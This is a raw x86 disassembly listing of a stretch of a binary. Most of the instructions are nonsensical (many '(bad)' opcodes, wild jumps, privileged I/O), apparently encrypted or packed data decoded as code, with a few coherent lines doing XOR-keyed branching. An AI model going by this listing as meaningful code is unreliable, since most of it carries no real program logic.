  414fcb:	scas   eax,DWORD PTR es:[edi]
  414fcc:	mov    ebp,0x94fa3e30
  414fd1:	std    
  414fd2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414fd3:	inc    eax
  414fd4:	daa    
  414fd5:	push   ecx
  414fd6:	stos   BYTE PTR es:[edi],al
  414fd7:	pop    ds
  414fd8:	jbe    0x415008
  414fda:	and    esp,esi
  414fdc:	inc    esi
  414fdd:	cmp    esi,DWORD PTR [edi+eax*4+0x58be1b33]
  414fe4:	stc    
  414fe5:	leave  
  414fe6:	xor    DWORD PTR [eax],esp
  414fe8:	repnz adc eax,0x50edc66d
  414fee:	adc    eax,0x1f52899f
  414ff3:	retf   0xed5
  414ff6:	inc    ebp
  414ff7:	push   eax
  414ff8:	jns    0x414f99
  414ffa:	inc    eax
  414ffb:	pop    edi
  414ffc:	jle    0x415052
  414ffe:	add    ebp,DWORD PTR [ebp-0x25]
  415001:	pop    ebx
  415002:	xchg   esp,eax
  415003:	push   edx
  415004:	int    0x2a
  415006:	inc    edx
  415007:	test   eax,0x7a0db4cf
  41500c:	pop    esi
  41500d:	add    dh,BYTE PTR [ecx-0x31]
  415010:	test   al,0x4a
  415012:	pop    edx
  415013:	(bad)  
  415014:	mov    ebp,0xfd3c96e9
  415019:	rol    DWORD PTR [ecx],1
  41501b:	loopne 0x414fb6
  41501d:	jecxz  0x41507a
  41501f:	mov    cl,0x19
  415021:	ret    
  415022:	jno    0x414fbc
  415024:	je     0x415094
  415026:	mov    esi,0xfd9ab458
  41502b:	mov    esp,edi
  41502d:	mov    cl,0x3b
  41502f:	outs   dx,BYTE PTR ds:[esi]
  415030:	sti    
  415031:	lds    ecx,FWORD PTR [esi]
  415033:	pushf  
  415034:	pop    esi
  415035:	pop    eax
  415036:	mov    bh,0xae
  415038:	or     al,0x19
  41503a:	mov    al,ds:0xb9089a32
  41503f:	les    ebp,FWORD PTR [esi-0x55bf8ac1]
  415045:	fistp  DWORD PTR [esi+edi*1-0x79]
  415049:	sbb    BYTE PTR [edx+edx*8+0x68],ch
  41504d:	cdq    
  41504e:	das    
  41504f:	jp     0x415051
  415051:	push   edx
  415052:	aas    
  415053:	jb     0x41500c
  415055:	loopne 0x4150c0
  415057:	cmp    al,0x40
  415059:	jmp    0xd6162645
  41505e:	outs   dx,BYTE PTR ds:[esi]
  41505f:	(bad)  
  415060:	in     al,dx
  415061:	mov    dh,0x70
  415063:	mov    edx,0x6d5b6232
  415068:	inc    esi
  415069:	inc    esi
  41506a:	jmp    0x41289254
  41506f:	jecxz  0x4150b2
  415071:	sub    al,0xd5
  415073:	cmp    DWORD PTR [edi+edx*4+0x17e9f3ca],ecx
  41507a:	or     ebx,DWORD PTR [ebx-0x2e]
  41507d:	push   edx
  41507e:	jl     0x415062
  415080:	cmp    ah,0x74
  415083:	outs   dx,DWORD PTR ds:[esi]
  415084:	inc    ebx
  415085:	push   ebp
  415086:	sub    BYTE PTR [edx],bl
  415088:	and    eax,0x6d625ef
  41508d:	and    BYTE PTR [ebp-0x78240a39],ah
  415093:	adc    BYTE PTR [esi-0x7a],0x4c
  415097:	jecxz  0x41501c
  415099:	pop    ds
  41509a:	pusha  
  41509b:	push   edx
  41509c:	cmp    DWORD PTR [ebp+0xc],edi
  41509f:	adc    BYTE PTR [eax+0x56],bl
  4150a2:	dec    esi
  4150a3:	adc    DWORD PTR [ebp-0x69],0x5dda0325
  4150aa:	fcmovnb st,st(7)
  4150ac:	sbb    cl,BYTE PTR ds:0xaf242642
  4150b2:	xchg   DWORD PTR [ecx-0x12],esp
  4150b5:	jns    0x41512c
  4150b7:	ds repz dec edi
  4150ba:	and    DWORD PTR [ebx],edi
  4150bc:	mov    al,0x7e
  4150be:	jbe    0x415128
  4150c0:	repnz adc eax,0x5b8f767f
  4150c6:	xlat   BYTE PTR ds:[ebx]
  4150c7:	shl    BYTE PTR [ecx-0x65],1
  4150ca:	push   esp
  4150cb:	je     0x41505f
  4150cd:	xchg   ecx,eax
  4150ce:	adc    BYTE PTR [edx+edx*2],0xb5
  4150d2:	loop   0x4150d3
  4150d4:	in     eax,dx
  4150d5:	pop    ebx
  4150d6:	adc    dl,BYTE PTR [ecx]
  4150d8:	mov    eax,0x2a7b2881
  4150dd:	mov    ch,cl
  4150df:	jns    0x415092
  4150e1:	sub    dh,BYTE PTR [esi-0x530a7246]
  4150e7:	push   ds
  4150e8:	frstor [ebp+ebp*4+0x7add534c]
  4150ef:	aas    
  4150f0:	mov    ebx,0xe547d503
  4150f5:	iret   
  4150f6:	sbb    ch,dh
  4150f8:	stos   DWORD PTR es:[edi],eax
  4150f9:	(bad)  
  4150fa:	jmp    0x9237cc24
  4150ff:	mov    al,ds:0x48e6a960
  415104:	mov    eax,0x66584b0d
  415109:	sbb    eax,0x5b2c840d
  41510e:	dec    eax
  41510f:	inc    edi
  415110:	mov    ecx,fs
  415112:	loopne 0x4150e6
  415114:	aad    0xc7
  415116:	mov    al,0x14
  415118:	pop    eax
  415119:	jns    0x415147
  41511b:	das    
  41511c:	sub    al,0xea
  41511e:	add    al,0x9b
  415120:	rcl    edx,1
  415122:	jns    0x41513e
  415124:	adc    edi,edx
  415126:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415127:	pop    edx
  415128:	ss ss jle 0x4151a1
  41512c:	push   ds
  41512d:	dec    ecx
  41512e:	cmp    ebx,esi
  415130:	aaa    
  415131:	retf   
  415132:	mov    cl,0xc0
  415134:	cwde   
  415135:	inc    ebp
  415136:	outs   dx,BYTE PTR ds:[esi]
  415137:	idiv   BYTE PTR [edi]
  415139:	ret    
  41513a:	pushf  
  41513b:	ins    DWORD PTR es:[edi],dx
  41513c:	jmp    0x41510d
  41513e:	outs   dx,DWORD PTR ds:[esi]
  41513f:	mov    al,0xb1
  415141:	cdq    
  415142:	fld    TBYTE PTR [edx+edx*4]
  415145:	sti    
  415146:	jae    0x415174
  415148:	jb     0x4150df
  41514a:	mov    al,0x33
  41514c:	xchg   edi,ecx
  41514e:	xchg   ebx,eax
  41514f:	dec    edx
  415150:	popa   
  415151:	repnz loope 0x4150f4
  415154:	repz jmp 0xc2db:0xa7903ce5
  41515c:	sbb    al,0xf8
  41515e:	dec    esp
  41515f:	jns    0x41511e
  415161:	test   DWORD PTR [eax],ecx
  415163:	or     ecx,DWORD PTR ds:0x1574f5df
  415169:	jne    0x415172
  41516b:	ins    DWORD PTR es:[edi],dx
  41516c:	xlat   BYTE PTR ds:[ebx]
  41516d:	lods   al,BYTE PTR ds:[esi]
  41516e:	retf   
  41516f:	mov    esp,0xf0001231
  415174:	ds call 0xf16b03c8
  41517a:	sub    dl,BYTE PTR [ecx+0x70]
  41517d:	mov    bh,0x6f
  41517f:	sub    esp,eax
  415181:	mov    DWORD PTR [ebp-0x24],esp
  415184:	mov    eax,DWORD PTR [ebp-0x4]
  415187:	mov    ecx,0x7510855
  41518c:	xor    eax,ecx
  41518e:	mov    edx,0x32729c
  415193:	jmp    0x415477
  415198:	mov    edi,0x35df28be
  41519d:	jne    0x4151f6
  41519f:	pop    esi
  4151a0:	push   ebx
  4151a2:	(bad)  
  4151a3:	(bad)  [edi-0x12da2ed8]
  4151a9:	add    eax,0x7eb9707f
  4151ae:	jo     0x415220
  4151b0:	dec    ebp
  4151b1:	cli    
  4151b2:	pop    edi
  4151b3:	lea    eax,[ebp+esi*1-0x6b]
  4151b7:	pushf  
  4151b8:	sbb    BYTE PTR [esi],cl
  4151ba:	out    dx,al
  4151bb:	cdq    
  4151bc:	cwde   
  4151bd:	lods   al,BYTE PTR ds:[esi]
  4151be:	add    DWORD PTR [eax+0x31],ebx
  4151c1:	dec    esi
  4151c2:	add    BYTE PTR [edi+0x31c0a3ea],0x2c
  4151c9:	pop    edx
  4151ca:	push   0x7ad36b8d
  4151cf:	aad    0x43
  4151d1:	ja     0x415233
  4151d3:	mov    al,ds:0xf09d1c00
  4151d8:	adc    eax,0x334032
  4151dd:	pushf  
  4151de:	push   cs
  4151df:	mov    bh,0x48
  4151e1:	mov    esp,0x203ea89a
  4151e6:	inc    esp
  4151e7:	inc    edx
  4151e8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4151e9:	icebp  
  4151ea:	adc    BYTE PTR [eax+eiz*1],al
  4151ed:	mov    ds:0xfdb0cd92,al
  4151f2:	js     0x415252
  4151f4:	jne    0x415213
  4151f6:	clc    
  4151f7:	cs jmp 0x165cf279
  4151fd:	fldenv [bx]
  415200:	sbb    BYTE PTR [ebp*1-0x6de560a8],0xb3
  415208:	(bad)  
  415209:	cmp    al,0xe5
  41520b:	call   0xac18ac30
  415210:	jo     0x4151ca
  415212:	jmp    0x4151b4
  415214:	pop    edi
  415215:	fs jno 0x415274
  415218:	mov    bl,0x38
  41521a:	jecxz  0x41522d
  41521c:	and    eax,0x23ed108a
  415221:	mov    ecx,0x2d2c776b
  415226:	xchg   edi,eax
  415227:	aam    0x0
  415229:	cld    
  41522a:	xchg   ecx,eax
  41522b:	lahf   
  41522c:	(bad)  
  41522d:	(bad)  
  41522e:	cwde   
  41522f:	fdivrp st(5),st
  415231:	repnz loop 0x4152af
  415234:	fdiv   DWORD PTR [ebx+0x45]
  415237:	jg     0x4151be
  415239:	rcr    esp,0x59
  41523c:	hlt    
  41523d:	xor    cl,BYTE PTR [esi-0x67]
  415240:	mov    edi,0xef270090
  415245:	dec    edi
  415246:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415247:	push   edx
  415248:	sbb    cl,BYTE PTR [ebx]
  41524a:	ja     0x4151f2
  41524c:	pop    es
  41524d:	push   edi
  41524e:	mov    bl,0xf5
  415250:	push   ss
  415251:	push   0x9c6948a3
  415256:	out    dx,al
  415257:	mov    dl,0x8b
  415259:	sbb    bl,ch
  41525b:	clc    
  41525c:	xor    eax,0x2d1b413d
  415261:	dec    ebp
  415262:	jmp    0x415271
  415264:	outs   dx,BYTE PTR ds:[esi]
  415265:	retf   0x8b73
  415268:	mov    ch,0x49
  41526a:	call   0x1d6a5de4
  41526f:	ins    DWORD PTR es:[edi],dx
  415270:	cmp    eax,0xb8ed97ba
  415275:	aad    0x70
  415277:	jmp    0xbd7bf464
  41527c:	ss dec ebp
  41527e:	push   ss
  41527f:	jp     0x415270
  415281:	and    eax,0xf5f289ec
  415286:	dec    edi
  415287:	cmp    DWORD PTR [edx-0x5a],eax
  41528a:	outs   dx,DWORD PTR ds:[esi]
  41528b:	stos   BYTE PTR es:[edi],al
  41528c:	push   cs
  41528d:	sub    BYTE PTR [edi-0x57a67288],0x32
  415294:	int    0x14
  415296:	pop    ds
  415297:	or     eax,0xe2700e86
  41529c:	jne    0x415239
  41529e:	or     ch,BYTE PTR [ebp+0x7b]
  4152a1:	(bad)  
  4152a2:	pop    ebp
  4152a3:	cmp    eax,0x2457a8fe
  4152a8:	adc    esp,eax
  4152aa:	mov    edi,0xa36c69b
  4152af:	je     0x415254
  4152b1:	push   ebx
  4152b2:	jp     0x41532d
  4152b4:	mov    bh,0x4c
  4152b6:	sub    eax,0x1bbdbafa
  4152bb:	ss (bad) 
  4152bd:	jbe    0x415301
  4152bf:	(bad)  [edi]
  4152c1:	rcl    BYTE PTR [ecx-0x70a81a8e],cl
  4152c7:	es mov ah,0xd7
  4152ca:	cmp    BYTE PTR [edx+0x4],ah
  4152cd:	daa    
  4152ce:	mov    esp,0xb2f48e5d
  4152d3:	xchg   edx,eax
  4152d4:	pop    ecx
  4152d5:	adc    bl,ch
  4152d7:	lahf   
  4152d8:	lods   eax,DWORD PTR ds:[esi]
  4152d9:	(bad)  
  4152da:	into   
  4152db:	arpl   bp,bp
  4152dd:	push   edx
  4152de:	mov    WORD PTR [edx+0x1f],gs
  4152e1:	xor    edx,DWORD PTR [eax]
  4152e3:	iret   
  4152e4:	cmp    eax,0x3b5390f9
  4152e9:	iret   
  4152ea:	repz and DWORD PTR [ebx-0x18],0xffffff91
  4152ef:	adc    esi,esp
  4152f1:	cdq    
  4152f2:	imul   esi,DWORD PTR [esi],0x5052b070
  4152f8:	int3   
  4152f9:	push   es
  4152fa:	add    esp,ecx
  4152fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4152fd:	lea    esp,[esi+edi*1-0x3d56e6f8]
  415304:	xchg   DWORD PTR ds:0xccedc48,eax
  41530a:	xchg   ebp,eax
  41530b:	and    BYTE PTR [edi-0x54],dh
  41530e:	sbb    BYTE PTR [edi],bh
  415310:	cmc    
  415311:	vprotw ymm11,xmm1,0x20
  415317:	into   
  415318:	icebp  
  415319:	daa    
  41531a:	push   ecx
  41531b:	mov    al,ds:0x641f9bd4
  415320:	xchg   ecx,eax
  415321:	mov    ch,0x4d
  415323:	imul   edx,DWORD PTR ds:0xe1166fb1,0x53
  41532a:	movhps xmm3,QWORD PTR [ebx-0x2716416f]
  415331:	retf   
  415332:	push   ds
  415333:	mov    DWORD PTR [esi-0x48],esp
  415336:	pop    ebp
  415337:	push   ecx
  415338:	aas    
  415339:	cmp    BYTE PTR [edx],bl
  41533b:	xor    BYTE PTR [esi+ebp*1+0x7cb43459],dh
  415342:	pop    es
  415343:	fmul   DWORD PTR [esi+ecx*2]
  415346:	xchg   ebp,eax
  415347:	push   ecx
  415348:	pusha  
  415349:	cmp    dh,dl
  41534b:	lods   eax,DWORD PTR ds:[esi]
  41534c:	clc    
  41534d:	xor    bl,BYTE PTR [ebp-0x55]
  415350:	and    bl,BYTE PTR [eax+0x24]
  415353:	mov    ?,WORD PTR [ebx]
  415355:	fs clc 
  415357:	scas   al,BYTE PTR es:[edi]
  415358:	sbb    edx,esp
  41535a:	xor    edi,edx
  41535c:	das    
  41535d:	cmp    cl,BYTE PTR [eax-0x2a]
  415360:	dec    esp
  415361:	shr    BYTE PTR [eax+0x70],0xa
  415365:	jno    0x4153de
  415367:	pop    edi
  415368:	mov    esi,0x867bd70
  41536d:	cmp    eax,0x7a97ef8f
  415372:	cli    
  415373:	dec    ebx
  415374:	clc    
  415375:	push   0x71
  415377:	cmp    eax,0xd9fb73b9
  41537c:	mov    ebp,0xd572beba
  415381:	or     al,0x92
  415383:	retf   
  415384:	imul   eax,ecx,0x19328c29
  41538a:	push   esi
  41538b:	adc    BYTE PTR [ecx+0x1e],0xa
  41538f:	idiv   BYTE PTR [edx]
  415391:	or     eax,0xb005e58b
  415396:	in     al,0x55
  415398:	adc    al,BYTE PTR [esp+esi*4+0x4f]
  41539c:	inc    ecx
  41539d:	ja     0x41534e
  41539f:	stc    
  4153a0:	loopne 0x41535c
  4153a2:	scas   al,BYTE PTR es:[edi]
  4153a3:	das    
  4153a4:	adc    al,dh
  4153a6:	jb     0x41533b
  4153a8:	jp     0x4153c6
  4153aa:	outs   dx,DWORD PTR ds:[esi]
  4153ab:	in     eax,0x32
  4153ad:	mov    DWORD PTR [ebx],ecx
  4153af:	in     eax,0x3b
  4153b1:	lds    ebp,FWORD PTR [edx+0x36a13a78]
  4153b7:	cmp    edi,DWORD PTR [esi+0x6857fff5]
  4153bd:	sti    
  4153be:	(bad)  
  4153c0:	dec    eax
  4153c1:	std    
  4153c2:	pop    ds
  4153c3:	inc    ebp
  4153c4:	lods   al,BYTE PTR ds:[esi]
  4153c5:	adc    esp,edi
  4153c7:	or     ecx,ecx
  4153c9:	int    0xb3
  4153cb:	out    0xb6,eax
  4153cd:	xor    DWORD PTR [ecx-0x4e14b82f],ecx
  4153d3:	lahf   
  4153d4:	and    eax,0x106d1b11
  4153d9:	inc    eax
  4153da:	mov    ebp,0x8640b91f
  4153df:	add    eax,0x7aee428c
  4153e4:	scas   al,BYTE PTR es:[edi]
  4153e5:	ins    DWORD PTR es:[edi],dx
  4153e6:	jne    0x4153f6
  4153e8:	add    esp,DWORD PTR [edx-0x40d4023]
  4153ee:	bound  edi,QWORD PTR [esi+ecx*4]
  4153f1:	dec    ebp
  4153f2:	popa   
  4153f3:	sub    al,0x8a
  4153f5:	mov    BYTE PTR [eax+0x3d],bl
  4153f8:	fs in  al,dx
  4153fa:	scas   al,BYTE PTR es:[edi]
  4153fb:	ja     0x415460
  4153fd:	ins    DWORD PTR es:[edi],dx
  4153fe:	stos   DWORD PTR es:[edi],eax
  4153ff:	lea    edx,[eax-0x7d]
  415402:	pop    es
  415403:	mov    dh,0xa5
  415405:	fdiv   st,st(5)
  415407:	je     0x415470
  415409:	push   ecx
  41540a:	gs jp  0x41546a
  41540d:	cs jg  0x41541e
  415410:	stos   BYTE PTR es:[edi],al
  415411:	(bad)  [ebp-0x10142342]
  415417:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415418:	retf   
  415419:	push   ebx
  41541a:	dec    esp
  41541b:	push   edx
  41541c:	inc    edi
  41541d:	cli    
  41541e:	or     bh,cl
  415420:	or     cl,0x23
  415423:	inc    esp
  415424:	push   esp
  415425:	add    cl,dl
  415427:	in     al,dx
  415428:	inc    eax
  415429:	dec    edi
  41542a:	out    dx,eax
  41542b:	adc    ah,dh
  41542d:	mov    BYTE PTR [edx-0xfcd5913],al
  415433:	into   
  415434:	cmp    edi,DWORD PTR [ecx+edx*4-0x7c]
  415438:	aam    0x15
  41543a:	jbe    0x41546e
  41543c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41543d:	out    dx,al
  41543e:	or     eax,0x7bc408ef
  415443:	sbb    eax,DWORD PTR ds:0xabfc043
  415449:	mov    bh,0xea
  41544b:	cmp    eax,0x12d0eca3
  415450:	in     al,dx
  415451:	push   esi
  415452:	sbb    eax,0xef0df25b
  415458:	das    
  415459:	das    
  41545a:	stos   DWORD PTR es:[edi],eax
  41545b:	fs call 0x869:0x2b13a1c8
  415463:	inc    ebp
  415464:	mov    edx,0x7d8e0d0f
  415469:	mov    bx,0xa304
  41546d:	dec    edx
  41546e:	jle    0x4154a9
  415470:	loope  0x4154a8
  415472:	into   
  415473:	repz jne 0x415402
  415476:	rol    BYTE PTR [ebx],1
  415478:	ret    0x4589
  41547b:	or     BYTE PTR [ebx-0x3ecc17bb],cl
  415481:	add    eax,edx
  415483:	mov    edx,DWORD PTR [ebp+0x14]
  415486:	imul   eax,DWORD PTR [edx]
  415489:	mov    edx,DWORD PTR [ebp-0x4]
  41548c:	xor    edx,ecx
  41548e:	mov    ecx,DWORD PTR [ebp+0x8]
  415491:	lea    ecx,[edx+ecx*1+0x32729c]
  415498:	cmp    ecx,eax
  41549a:	je     0x416385
  4154a0:	mov    edi,DWORD PTR [ebp-0x18]
  4154a3:	mov    eax,DWORD PTR [ebp+0x8]
  4154a6:	mov    edx,DWORD PTR [ebp+0x14]
  4154a9:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  4154ad:	mov    ecx,0x7510855
  4154b2:	xor    edx,edx
  4154b4:	xor    edi,ecx
  4154b6:	jmp    0x41579a
  4154bb:	sub    dh,cl
  4154bd:	sub    BYTE PTR [ecx+0x71b159f7],bl
  4154c3:	xchg   esi,edx
  4154c5:	push   ebx
  4154c6:	mov    ch,0x40
  4154c8:	adc    bh,BYTE PTR [ecx]
  4154ca:	pop    edi
  4154cb:	add    bh,BYTE PTR ss:[edi+0x70]
  4154cf:	mov    ecx,0x4870707e
  4154d4:	push   ss
  4154d5:	icebp  
  4154d6:	pop    edi
  4154d7:	fistp  DWORD PTR [ecx-0x4247d398]
  4154dd:	idiv   esi
  4154df:	sbb    DWORD PTR [ecx-0xe0f3e3e],0x6e8e79be
  4154e9:	ja     0x415521
  4154eb:	dec    ebx
  4154ec:	inc    ecx
  4154ed:	mov    dh,0xb9
  4154ef:	add    eax,0x5cce4e09
  4154f4:	hlt    
  4154f5:	inc    esp
  4154f6:	xor    BYTE PTR [ecx-0xa],ch
  4154f9:	das    
  4154fa:	adc    BYTE PTR [ebp+0x78],ch
  4154fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4154fe:	push   edi
  4154ff:	or     al,0x59
  415501:	adc    BYTE PTR [edi-0x2c],al
  415504:	test   BYTE PTR [eax+0x6e],0x33
  415508:	das    
  415509:	rcl    BYTE PTR [ebx+0x6b],cl
  41550c:	sar    BYTE PTR [edx],0x28
  41550f:	ins    BYTE PTR es:[edi],dx
  415510:	addr16 aaa 
  415512:	jp     0x41557d
  415514:	adc    BYTE PTR [esi+eiz*2-0x39],0x91
  415519:	and    esp,DWORD PTR [edx+0x6cd1e5f6]
  41551f:	xor    al,0x3d
  415521:	jne    0x415587
  415523:	pusha  
  415524:	jge    0x415547
  415526:	ret    
  415527:	test   al,0x9c
  415529:	aad    0x3e
  41552b:	xor    eax,0x88af9c57
  415530:	loope  0x415545
  415532:	push   ebp
  415533:	repnz xchg esp,eax
  415535:	jnp    0x4154b8
  415537:	or     eax,0xdd3b71ae
  41553c:	sub    edi,edi
  41553e:	fmul   DWORD PTR [edx]
  415540:	fsub   QWORD PTR [ecx-0x7d2649a3]
  415546:	and    BYTE PTR [ecx],cl
  415548:	dec    edi
  415549:	rcr    DWORD PTR [ecx],cl
  41554b:	dec    eax
  41554c:	loope  0x4154e3
  41554e:	push   es
  41554f:	adc    eax,0x49a746d9
  415554:	or     eax,0x1d16fec4
  415559:	(bad)  
  41555a:	cmp    BYTE PTR [ecx+0x6a],bl
  41555d:	cmp    eax,0x4adf9a4c
  415562:	mov    cl,0xdf
  415564:	retf   0x80c8
  415567:	xor    bh,BYTE PTR [edi-0x24]
  41556a:	fild   WORD PTR [ebp+0x8]
  41556d:	in     eax,0x3b
  41556f:	fwait
  415570:	in     eax,dx
  415571:	ss pop esp
  415573:	push   ebx
  415574:	pop    ss
  415575:	mov    ebx,0x7fb1ecd1
  41557a:	cli    
  41557b:	xor    al,0xcd
  41557d:	fimul  DWORD PTR [edi+edi*1+0x4c8a24a]
  415584:	pop    edi
  415585:	fnop   
  415587:	mov    ah,0x63
  415589:	inc    ebp
  41558a:	dec    esp
  41558b:	mov    BYTE PTR [ebp-0x61],dh
  41558e:	out    dx,eax
  41558f:	ins    BYTE PTR es:[edi],dx
  415590:	mov    ebx,0x4ff6fd0c
  415595:	ret    
  415596:	dec    ebp
  415597:	in     al,0x27
  415599:	das    
  41559a:	and    eax,0x561b274
  41559f:	vpandn ymm6,ymm1,YMMWORD PTR [ecx]
  4155a3:	out    0x88,al
  4155a5:	outs   dx,BYTE PTR ds:[esi]
  4155a6:	push   ss
  4155a7:	sbb    al,0x8b
  4155a9:	pop    eax
  4155aa:	mov    ch,0xe
  4155ac:	push   edx
  4155ad:	mov    ch,0xb8
  4155af:	inc    edi
  4155b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155b1:	sub    eax,DWORD PTR [ebx-0x368fc532]
  4155b7:	call   FWORD PTR [eax+0x7f066d4]
  4155bd:	xchg   ecx,eax
  4155be:	aam    0xa8
  4155c0:	je     0x41562e
  4155c2:	mov    WORD PTR [esi+0x77713789],gs
  4155c8:	test   BYTE PTR [esi],al
  4155ca:	aam    0x82
  4155cc:	sbb    BYTE PTR [edi-0x6de6fca5],cl
  4155d2:	cmp    dl,BYTE PTR [eax+edi*1+0x65f7069a]
  4155d9:	jmp    0x415609
  4155db:	add    dh,al
  4155dd:	or     dh,al
  4155df:	ret    
  4155e0:	lock jmp 0xe18f9c07
  4155e6:	in     al,0x9
  4155e8:	pop    edx
  4155e9:	jmp    0x4913102
  4155ee:	push   ds
  4155ef:	popf   
  4155f0:	scas   al,BYTE PTR es:[edi]
  4155f1:	mov    dh,0x99
  4155f3:	xor    al,0xa
  4155f5:	push   esi
  4155f6:	jbe    0x41558a
  4155f8:	ins    DWORD PTR es:[edi],dx
  4155f9:	out    dx,eax
  4155fa:	jge    0x4155b4
  4155fc:	pop    ebx
  4155fd:	push   cs
  4155fe:	pop    ebp
  4155ff:	ins    DWORD PTR es:[edi],dx
  415600:	popa   
  415601:	push   edx
  415602:	cmp    eax,0x77cc7df9
  415607:	imul   esi
  415609:	dec    esp
  41560a:	in     al,dx
  41560b:	add    BYTE PTR [ebx],0xa6
  41560e:	gs stc 
  415610:	cmp    al,0x76
  415612:	push   0x777ad835
  415617:	ja     0x415681
  415619:	cs cmc 
  41561b:	jmp    0x4155c8
  41561d:	(bad)  
  41561e:	retf   
  41561f:	fst    QWORD PTR [ecx+0x13707879]
  415625:	enter  0x3eaf,0xe8
  415629:	out    dx,eax
  41562a:	shl    BYTE PTR [ebx+0x4f41bed0],1
  415630:	add    eax,0x994fa7a0
  415635:	pusha  
  415636:	sub    edi,edi
  415638:	mov    esp,0x80756198
  41563d:	stos   DWORD PTR es:[edi],eax
  41563e:	mov    eax,0xebed2e6a
  415643:	fld    QWORD PTR [ebx+0x2c957877]
  415649:	(bad)  
  41564a:	cwde   
  41564b:	sahf   
  41564c:	and    al,0x25
  41564e:	adc    DWORD PTR [ebp+0x5b],0xf98d063c
  415655:	lahf   
  415656:	lods   eax,DWORD PTR ds:[esi]
  415657:	add    ah,BYTE PTR [edx]
  415659:	cmp    edi,ebx
  41565b:	fs xchg cl,cl
  41565e:	xchg   ecx,eax
  41565f:	pop    esi
  415660:	stos   BYTE PTR es:[edi],al
  415661:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415662:	and    DWORD PTR [ebx+0x7863494a],ecx
  415668:	cmp    DWORD PTR [edi],0xbc6672f3
  41566e:	pop    es
  41566f:	push   edi
  415670:	sbb    dl,BYTE PTR [edx+edx*2-0x69]
  415674:	mov    BYTE PTR [esi],bh
  415676:	retf   
  415677:	add    eax,0x1634446b
  41567c:	sbb    ah,ch
  41567e:	add    dl,cl
  415680:	mov    eax,ds:0x420ca7bc
  415685:	xchg   ebx,eax
  415686:	fcom   DWORD PTR [edi+esi*8+0x2afd43c6]
  41568d:	adc    al,0xf1
  41568f:	out    0x77,eax
  415691:	stos   BYTE PTR es:[edi],al
  415692:	inc    eax
  415693:	enter  0x1b73,0x43
  415697:	xor    eax,0x67cae150
  41569c:	ror    cl,cl
  41569e:	repz add BYTE PTR [eax],dh
  4156a1:	add    al,0x23
  4156a3:	jbe    0x415710
  4156a5:	into   
  4156a6:	sub    eax,0xc7fe8509
  4156ab:	(bad)  
  4156ac:	and    ebp,DWORD PTR [ebp-0x64]
  4156af:	test   DWORD PTR [edx],edx
  4156b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156b2:	inc    ecx
  4156b3:	add    DWORD PTR [ebx+0x23e4b1c1],ebp
  4156b9:	jne    0x415712
  4156bb:	cmp    BYTE PTR [edi-0x6e7e3aec],0x45
  4156c2:	xchg   edx,eax
  4156c3:	in     al,0xdd
  4156c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4156c6:	inc    eax
  4156c7:	rcr    DWORD PTR [ebp-0x71],0xe6
  4156cb:	stos   BYTE PTR es:[edi],al
  4156cc:	mov    al,0x68
  4156ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4156cf:	pop    ebp
  4156d0:	in     al,dx
  4156d1:	and    bh,ah
  4156d3:	cmp    BYTE PTR [ecx+0x6a],dh
  4156d6:	and    eax,0x2b011c18
  4156db:	jmp    0x4156ea
  4156dd:	(bad)  
  4156de:	mov    ds:0x6396ed90,al
  4156e3:	stos   DWORD PTR es:[edi],eax
  4156e4:	std    
  4156e5:	mov    ah,0x9
  4156e7:	mov    bl,0x34
  4156e9:	les    esi,FWORD PTR [eax-0x4a]
  4156ec:	jl     0x415724
  4156ee:	mov    esp,0xdeda298d
  4156f3:	xchg   edi,eax
  4156f4:	icebp  
  4156f5:	lds    ebp,FWORD PTR [edi+ebx*4]
  4156f8:	push   0xffffffd2
  4156fa:	inc    eax
  4156fb:	inc    edi
  4156fc:	or     eax,0x2056097f
  415701:	test   al,0x6d
  415703:	test   eax,0xe41efa9d
  415708:	adc    BYTE PTR [esi+0x9],dh
  41570b:	sub    ebp,DWORD PTR ds:0x4982edac
  415711:	adc    eax,0xa6efbf1
  415716:	ins    DWORD PTR es:[edi],dx
  415717:	or     al,0x6f
  415719:	dec    edx
  41571a:	dec    esi
  41571b:	icebp  
  41571c:	int    0xc7
  41571e:	(bad)  
  41571f:	icebp  
  415720:	jmp    0x4156d7
  415722:	retf   
  415723:	test   BYTE PTR [esi+0x3c],bl
  415726:	outs   dx,DWORD PTR ds:[esi]
  415727:	popf   
  415728:	pop    eax
  415729:	lea    eax,[ebp+eax*2+0x4f]
  41572d:	xchg   esp,eax
  41572e:	mov    DWORD PTR [eax-0x710b5659],esi
  415734:	jle    0x4156b7
  415736:	scas   eax,DWORD PTR es:[edi]
  415737:	adc    eax,0xff755b15
  41573c:	ja     0x41575c
  41573e:	call   0x54bf:0x6aa7820a
  415745:	rcl    DWORD PTR [ecx-0x222826b1],1
  41574b:	mov    al,ds:0x5c252700
  415750:	fistp  QWORD PTR [edx-0x2d6ac519]
  415756:	pop    es
  415757:	mov    dl,0x16
  415759:	add    BYTE PTR [edx+eax*8],ch
  41575c:	js     0x4156e1
  41575e:	push   cs
  41575f:	dec    eax
  415760:	xlat   BYTE PTR ds:[ebx]
  415761:	sbb    al,0xe6
  415763:	out    dx,al
  415764:	xchg   ebx,eax
  415765:	add    al,0xfa
  415767:	lods   eax,DWORD PTR ds:[esi]
  415768:	repnz aam 0x57
  41576b:	jmp    DWORD PTR [ebp+0x1d6f3c7]
  415771:	fcomp  QWORD PTR [eax-0x5b11a3d8]
  415777:	adc    al,dl
  415779:	jle    0x415721
  41577b:	(bad)  
  41577c:	int3   
  41577d:	push   ebx
  41577e:	inc    eax
  41577f:	dec    esp
  415780:	push   es
  415781:	xchg   esi,eax
  415782:	outs   dx,BYTE PTR ds:[esi]
  415783:	push   cs
  415784:	mov    dl,0x31
  415786:	aas    
  415787:	xchg   DWORD PTR [esi],esi
  415789:	in     al,dx
